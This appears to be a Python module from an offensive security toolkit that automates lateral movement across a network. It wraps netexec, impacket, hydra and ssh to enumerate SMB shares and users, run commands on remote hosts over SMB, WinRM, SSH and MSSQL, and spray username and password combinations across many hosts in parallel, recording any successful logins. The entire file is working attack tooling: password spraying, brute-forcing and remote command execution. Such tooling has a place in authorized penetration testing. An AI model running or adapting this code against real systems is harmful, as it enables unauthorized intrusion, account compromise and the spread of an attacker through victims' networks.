"""
attack.pivot — lateral movement orchestration.
Wraps netexec (nxc), impacket, hydra, ssh, smbclient with sane defaults.
Never fires on its own — caller decides when.
"""
import os
import re
import json
import shlex
import subprocess
import pathlib
import concurrent.futures


def _run(cmd, timeout=600):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return {"cmd": cmd, "rc": r.returncode,
                "out": (r.stdout + r.stderr)[:8000]}
    except subprocess.TimeoutExpired:
        return {"cmd": cmd, "rc": -1, "out": "[timeout]"}
    except Exception as e:
        return {"cmd": cmd, "rc": -1, "out": str(e)}


def _have(binary):
    for p in os.environ.get("PATH", "").split(os.pathsep):
        if pathlib.Path(p, binary).exists():
            return True
    return False


# ---------- SMB ----------

def smb_enum(host, user="", password="", domain=""):
    """Enumerate SMB shares + users. Requires nxc or smbclient."""
    results = {}
    if _have("nxc") or _have("netexec"):
        binary = "nxc" if _have("nxc") else "netexec"
        if user and password:
            cmd = f"{binary} smb {shlex.quote(host)} -u {shlex.quote(user)} -p {shlex.quote(password)} --shares --users --groups"
        else:
            cmd = f"{binary} smb {shlex.quote(host)} -u '' -p '' --shares"
        results["nxc"] = _run(cmd, timeout=180)
    elif _have("smbclient"):
        results["smbclient"] = _run(f"smbclient -N -L //{shlex.quote(host)}", timeout=60)
    else:
        results["error"] = "no smb tool (install: pipx install netexec OR pkg install smbclient)"
    return results


def smb_exec(host, user, password, command, domain=""):
    """Execute a command on target via SMB. Requires nxc."""
    if not (_have("nxc") or _have("netexec")):
        return {"error": "nxc not installed"}
    binary = "nxc" if _have("nxc") else "netexec"
    cmd = (f"{binary} smb {shlex.quote(host)} -u {shlex.quote(user)} "
           f"-p {shlex.quote(password)} -x {shlex.quote(command)}")
    return _run(cmd, timeout=180)


# ---------- WinRM ----------

def winrm_exec(host, user, password, command):
    if not (_have("nxc") or _have("netexec")):
        return {"error": "nxc not installed"}
    binary = "nxc" if _have("nxc") else "netexec"
    cmd = (f"{binary} winrm {shlex.quote(host)} -u {shlex.quote(user)} "
           f"-p {shlex.quote(password)} -x {shlex.quote(command)}")
    return _run(cmd, timeout=180)


# ---------- SSH ----------

def ssh_exec(host, user, password, command):
    if not _have("sshpass"):
        # use key-based ssh
        cmd = f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 {shlex.quote(user)}@{shlex.quote(host)} {shlex.quote(command)}"
    else:
        cmd = (f"sshpass -p {shlex.quote(password)} ssh -o StrictHostKeyChecking=no "
               f"-o ConnectTimeout=10 {shlex.quote(user)}@{shlex.quote(host)} {shlex.quote(command)}")
    return _run(cmd, timeout=120)


# ---------- MSSQL ----------

def mssql_exec(host, user, password, query, port=1433, database="master"):
    """Uses impacket's mssqlclient.py if available."""
    if not _have("impacket-mssqlclient"):
        return {"error": "impacket-mssqlclient not installed (pipx install impacket)"}
    cmd = (f"impacket-mssqlclient {shlex.quote(user)}:{shlex.quote(password)}@{host} "
           f"-port {port} -db {database} -windows-auth -q {shlex.quote(query)}")
    return _run(cmd, timeout=60)


# ---------- bruteforce ----------

def hydra_spray(host, service, users_file, passwords_file, threads=4):
    if not _have("hydra"):
        return {"error": "hydra not installed (pkg install hydra)"}
    cmd = (f"hydra -L {shlex.quote(users_file)} -P {shlex.quote(passwords_file)} "
           f"-t {threads} -f -V {shlex.quote(host)} {service}")
    return _run(cmd, timeout=3600)


# ---------- parallel sweep ----------

def sweep(hosts, fn, workers=8):
    """Run fn(host) over a host list in parallel. Returns {host: result}."""
    out = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(fn, h): h for h in hosts}
        for f in concurrent.futures.as_completed(futs):
            h = futs[f]
            try:
                out[h] = f.result()
            except Exception as e:
                out[h] = {"error": str(e)}
    return out


# ---------- auth bundle ----------

def spray_creds(hosts, users, passwords, service="smb", workers=8):
    """Try every user x password combo against every host on a service."""
    creds = [(u, p) for u in users for p in passwords]
    hits = []

    def try_one(host):
        for (u, p) in creds:
            if service == "smb":
                r = smb_enum(host, u, p)
            elif service == "winrm":
                r = winrm_exec(host, u, p, "whoami")
            elif service == "ssh":
                r = ssh_exec(host, u, p, "id")
            else:
                continue
            out = r.get("nxc", {}).get("out", "") or r.get("cmd", "")
            if re.search(r"Pwn3d|SUCCESS|uid=\d|whoami succeeded", out, re.I):
                hits.append({"host": host, "user": u, "pass": p, "service": service})
        return hits

    sweep(hosts, try_one, workers=workers)
    return hits


def status():
    return {
        "nxc":        _have("nxc") or _have("netexec"),
        "impacket":   _have("impacket-mssqlclient"),
        "hydra":      _have("hydra"),
        "sshpass":    _have("sshpass"),
        "smbclient":  _have("smbclient"),
    }


if __name__ == "__main__":
    print(json.dumps(status(), indent=2))
